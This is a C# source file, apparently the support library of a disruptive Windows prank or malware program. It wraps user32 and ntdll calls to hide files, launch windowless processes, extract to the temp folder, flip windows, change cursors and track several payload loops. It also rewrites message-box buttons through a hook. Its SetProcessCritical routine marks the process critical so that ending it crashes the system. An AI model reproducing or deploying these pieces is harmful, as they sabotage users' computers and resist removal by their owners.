using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Permissions;
using System.Linq;
using System.IO;

#pragma warning disable 0618

[assembly: SecurityPermission(SecurityAction.RequestMinimum, UnmanagedCode = true)]

namespace Library
{
    public static class lib
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("user32.dll")]
        public static extern IntPtr LoadCursorFromFile(string lpFileName);
        [DllImport("user32.dll")]
        public static extern bool SetSystemCursor(IntPtr hcur, uint id);

        [DllImport("user32.dll", EntryPoint = "SendMessageTimeout", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern uint SendMessageTimeoutText(IntPtr hWnd, int Msg, int countOfChars, StringBuilder text, uint flags, uint uTImeoutj, out IntPtr result);
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumChildWindows(IntPtr hwndParent, EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int y, int cX, int cY, int wFlags);
        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out Structure.Rect lpRect);
        [DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int value);
        [DllImport("user32.dll")]
        internal static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        internal static extern IntPtr FindWindowEx(IntPtr parentHandle, int childAfter, string className, int windowTitle);
        [DllImport("user32.dll")]
        static extern IntPtr GetShellWindow();
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static void HideFile(string path)
        {
            File.SetAttributes(path, FileAttributes.Hidden);
        }

        public static Rectangle getrect(IntPtr hWnd)
        {
            Structure.Rect hWndRect = new Structure.Rect();
            GetWindowRect(hWnd, out hWndRect);

            return new Rectangle(hWndRect.X, hWndRect.Y, hWndRect.Width, hWndRect.Height);
        }

        public static Point GetLocation(IntPtr hWnd)
        {
            Rectangle rec = getrect(hWnd);
            Point point = new Point(rec.X, rec.Y);
            return point;
        }

        public static void FlipLeft(IntPtr hWnd)
        {
            var currentStyle = GetWindowLong(hWnd, -20);
            SetWindowLong(hWnd, -20, (currentStyle | (int)0x00400000L));
        }

        public static void FlipRight(IntPtr hWnd)
        {
            SetWindowLong(hWnd, -20, 0);
        }

        public static void _FlipLeft()
        {
            IntPtr hWnd = GetForegroundWindow();
            FlipLeft(hWnd);
        }

        public static void _FlipRight()
        {
            IntPtr hWnd = GetForegroundWindow();
            FlipRight(hWnd);
        }
    }

    class strings
    {
        public static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }

    public static class variables
    {
        public static string ExtractPath = Path.GetTempPath();
        public static bool swRunning = true;
        public static bool fwcRunning = true;
        public static bool mbRunning = true;
        public static bool dcRunning = true;
        public static bool stRunning = true;
    }

    public static class Structure
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct Rect
        {
            private int _Left;
            private int _Top;
            private int _Right;
            private int _Bottom;

            public Rect(Rect Rectangle) : this(Rectangle.Left, Rectangle.Top, Rectangle.Right, Rectangle.Bottom)
            {
            }
            public Rect(int Left, int Top, int Right, int Bottom)
            {
                _Left = Left;
                _Top = Top;
                _Right = Right;
                _Bottom = Bottom;
            }

            public int X
            {
                get { return _Left; }
                set { _Left = value; }
            }
            public int Y
            {
                get { return _Top; }
                set { _Top = value; }
            }
            public int Left
            {
                get { return _Left; }
                set { _Left = value; }
            }
            public int Top
            {
                get { return _Top; }
                set { _Top = value; }
            }
            public int Right
            {
                get { return _Right; }
                set { _Right = value; }
            }
            public int Bottom
            {
                get { return _Bottom; }
                set { _Bottom = value; }
            }
            public int Height
            {
                get { return _Bottom - _Top; }
                set { _Bottom = value + _Top; }
            }
            public int Width
            {
                get { return _Right - _Left; }
                set { _Right = value + _Left; }
            }
            public Point Location
            {
                get { return new Point(Left, Top); }
                set
                {
                    _Left = value.X;
                    _Top = value.Y;
                }
            }
            public Size Size
            {
                get { return new Size(Width, Height); }
                set
                {
                    _Right = value.Width + _Left;
                    _Bottom = value.Height + _Top;
                }
            }

            public static implicit operator Rectangle(Rect Rectangle)
            {
                return new Rectangle(Rectangle.Left, Rectangle.Top, Rectangle.Width, Rectangle.Height);
            }
            public static implicit operator Rect(Rectangle Rectangle)
            {
                return new Rect(Rectangle.Left, Rectangle.Top, Rectangle.Right, Rectangle.Bottom);
            }
            public static bool operator ==(Rect Rectangle1, Rect Rectangle2)
            {
                return Rectangle1.Equals(Rectangle2);
            }
            public static bool operator !=(Rect Rectangle1, Rect Rectangle2)
            {
                return !Rectangle1.Equals(Rectangle2);
            }

            public override string ToString()
            {
                return "{Left: " + _Left + "; " + "Top: " + _Top + "; Right: " + _Right + "; Bottom: " + _Bottom + "}";
            }

            public override int GetHashCode()
            {
                return ToString().GetHashCode();
            }

            public bool Equals(Rect Rectangle)
            {
                return Rectangle.Left == _Left && Rectangle.Top == _Top && Rectangle.Right == _Right && Rectangle.Bottom == _Bottom;
            }

            public override bool Equals(object Object)
            {
                if (Object is Rect)
                {
                    return Equals((Rect)Object);
                }
                else if (Object is Rectangle)
                {
                    return Equals(new Rect((Rectangle)Object));
                }

                return false;
            }
        }
    }
}

namespace System.Diagnostics
{
    public static class SetProcessCritical
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

        public static void Init()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }
    }

    public static class CreateProcessNoWindow
    {
        public static void Create(ProcessStartInfo psi)
        {
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
    }
}

namespace System.Windows.Forms
{
    public class MessageBoxManager
    {
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        private delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

        private const int WH_CALLWNDPROCRET = 12;
        private const int WM_DESTROY = 0x0002;
        private const int WM_INITDIALOG = 0x0110;
        private const int WM_TIMER = 0x0113;
        private const int WM_USER = 0x400;
        private const int DM_GETDEFID = WM_USER + 0;

        private const int MBOK = 1;
        private const int MBCancel = 2;
        private const int MBAbort = 3;
        private const int MBRetry = 4;
        private const int MBIgnore = 5;
        private const int MBYes = 6;
        private const int MBNo = 7;


        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, int threadId);

        [DllImport("user32.dll")]
        private static extern int UnhookWindowsHookEx(IntPtr idHook);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthW", CharSet = CharSet.Unicode)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextW", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int maxLength);

        [DllImport("user32.dll")]
        private static extern int EndDialog(IntPtr hDlg, IntPtr nResult);

        [DllImport("user32.dll")]
        private static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", EntryPoint = "GetClassNameW", CharSet = CharSet.Unicode)]
        private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern int GetDlgCtrlID(IntPtr hwndCtl);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDlgItem(IntPtr hDlg, int nIDDlgItem);

        [DllImport("user32.dll", EntryPoint = "SetWindowTextW", CharSet = CharSet.Unicode)]
        private static extern bool SetWindowText(IntPtr hWnd, string lpString);


        [StructLayout(LayoutKind.Sequential)]
        public struct CWPRETSTRUCT
        {
            public IntPtr lResult;
            public IntPtr lParam;
            public IntPtr wParam;
            public uint message;
            public IntPtr hwnd;
        };

        private static HookProc hookProc;
        private static EnumChildProc enumProc;
        [ThreadStatic]
        private static IntPtr hHook;
        [ThreadStatic]
        private static int nButton;

        public static string OK = "&OK";
        public static string Cancel = "&Cancel";
        public static string Abort = "&Abort";
        public static string Retry = "&Retry";
        public static string Ignore = "&Ignore";
        public static string Yes = "&Yes";
        public static string No = "&No";

        static MessageBoxManager()
        {
            hookProc = new HookProc(MessageBoxHookProc);
            enumProc = new EnumChildProc(MessageBoxEnumProc);
            hHook = IntPtr.Zero;
        }

        public static void Register()
        {
            if (hHook != IntPtr.Zero)
                throw new NotSupportedException("One hook per thread allowed.");
            hHook = SetWindowsHookEx(WH_CALLWNDPROCRET, hookProc, IntPtr.Zero, AppDomain.GetCurrentThreadId());
        }

        public static void Unregister()
        {
            if (hHook != IntPtr.Zero)
            {
                UnhookWindowsHookEx(hHook);
                hHook = IntPtr.Zero;
            }
        }

        private static IntPtr MessageBoxHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0)
                return CallNextHookEx(hHook, nCode, wParam, lParam);

            CWPRETSTRUCT msg = (CWPRETSTRUCT)Marshal.PtrToStructure(lParam, typeof(CWPRETSTRUCT));
            IntPtr hook = hHook;

            if (msg.message == WM_INITDIALOG)
            {
                int nLength = GetWindowTextLength(msg.hwnd);
                StringBuilder className = new StringBuilder(10);
                GetClassName(msg.hwnd, className, className.Capacity);
                if (className.ToString() == "#32770")
                {
                    nButton = 0;
                    EnumChildWindows(msg.hwnd, enumProc, IntPtr.Zero);
                    if (nButton == 1)
                    {
                        IntPtr hButton = GetDlgItem(msg.hwnd, MBCancel);
                        if (hButton != IntPtr.Zero)
                            SetWindowText(hButton, OK);
                    }
                }
            }

            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        private static bool MessageBoxEnumProc(IntPtr hWnd, IntPtr lParam)
        {
            StringBuilder className = new StringBuilder(10);
            GetClassName(hWnd, className, className.Capacity);
            if (className.ToString() == "Button")
            {
                int ctlId = GetDlgCtrlID(hWnd);
                switch (ctlId)
                {
                    case MBOK:
                        SetWindowText(hWnd, OK);
                        break;
                    case MBCancel:
                        SetWindowText(hWnd, Cancel);
                        break;
                    case MBAbort:
                        SetWindowText(hWnd, Abort);
                        break;
                    case MBRetry:
                        SetWindowText(hWnd, Retry);
                        break;
                    case MBIgnore:
                        SetWindowText(hWnd, Ignore);
                        break;
                    case MBYes:
                        SetWindowText(hWnd, Yes);
                        break;
                    case MBNo:
                        SetWindowText(hWnd, No);
                        break;

                }
                nButton++;
            }

            return true;
        }
    }
}